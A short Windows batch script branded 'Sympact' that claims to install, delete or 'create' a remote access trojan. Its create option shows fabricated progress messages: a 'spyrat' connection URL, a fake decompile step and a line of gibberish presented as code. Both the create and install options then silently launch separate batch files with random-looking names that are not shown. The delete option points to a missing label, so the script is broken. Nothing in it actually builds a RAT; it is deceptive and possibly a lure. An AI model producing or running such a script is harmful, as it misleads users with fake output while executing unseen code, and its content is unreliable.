echo off
cls
echo Copyright Sympact
:choice
set /P c=Do you want to install[I] Delete[D] or create rat[C](FIRST EDIT RAT.PY BEFORE CREATING)
if /I "%c%" EQU "I" goto :installprogram
if /I "%c%" EQU "D" goto :deleteprogram
if /I "%c%" EQU "C" goto :createrat
goto :choice


:installprogram

cls 
echo Copyright Sympact
echo Creating Installer...
START THsiOTsfJP.bat

exit

:createrat

cls
echo Copyright Sympact
echo Connecting with https://sympact.xyz/spyrat:37328253973297879598345777987346997
PING localhost -n 5 >NUL
cls
echo Copyright Sympact
echo Configuring Bootstrapper....
echo Decompiling /Dev/Updater.bin TO Updater.py
PING localhost -n 5 >NUL
cls
echo Copyright Sympact 
echo func update()
echo init(n/nv/svd/g/sd/fs/df/sh//dh//df/g//dgf/hr/j/tu/u/j/f/d/f//dfg/dh/fj/t/j/g/hfd//gd/gdg/f/jfg/j/j/e/g/f/d/bfg//yt/h/d/hyd/hd//gtstrt/et/tg/trj/dgh/fgsd/ge/ghs/srth/std/ghsd/h/dsg/fds/gd/ae///ef/ear/eg/r/aeag/ra/tg/ea/gr/g/g/eer/g/aer/ga/reg/aeg/ae/g/aeg/ear/g/eag/at/rth/st/h/df//ga//F//G//A///RE/EG/EG/TRH/HET//TH/ETH/E/E/ET/HET///ETEH/HER///DECOMPILER)
PING localhost -n 5 >NUL
start RjsIODOGksODOGHK.bat
cls
exit

:Delete

echo just delete the folder skid...
pause
exit
